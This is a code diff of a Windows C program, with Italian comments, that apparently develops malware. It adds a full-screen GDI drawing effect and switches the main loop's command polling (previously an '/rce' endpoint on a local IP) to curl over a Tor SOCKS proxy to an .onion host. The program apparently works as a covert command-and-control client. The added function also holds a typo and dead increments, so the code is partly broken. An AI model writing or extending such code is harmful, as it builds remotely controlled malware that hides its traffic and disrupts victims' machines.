@@ -98,6 +98,26 @@ void ltunnel_run() {
     Sleep(100);
 }
 
+void squarefx_run() {
+    w = GetSystemMetrics(SM_CXSREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+    HDC hdc = GetDC(NULL);
+    int x = 0;
+    int y = 0;
+
+    HBRUSH white = CreateSolidBrush(RGB(255, 255, 255)); // crea pennello brushed bianco
+    SelectObject(hdc, white); // usa sopra l'hdc, con il bianco
+
+    Rectangle(hdc, 0, 0, x + 100, y + 50); // top, left, bottom, right
+    x = x + 1;
+    y = y + 1;
+
+    //avoid mem leaks
+    DeleteObject(white);
+    ReleaseDC(NULL, hdc);
+
+}
+
 void startfx() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
@@ -113,7 +133,7 @@ int main() {
     while(1) {
         printf("Clean\n");
         char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
-        FILE *pointertotextstream = popen("curl -s http://192.168.122.1:80/rce", "r"); // apre curl in modalita' sola lettura. 
+        FILE *pointertotextstream = popen("curl -s --socks5-hostname 127.0.0.1:9050 http://xxx.onion", "r"); // apre curl in modalita' sola lettura. 
 
         if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
         
@@ -177,4 +197,4 @@ int main() {
     return 0;
 }
 
-// connessiove a tor via curl (guarda il volantino di xebynginecli)
+
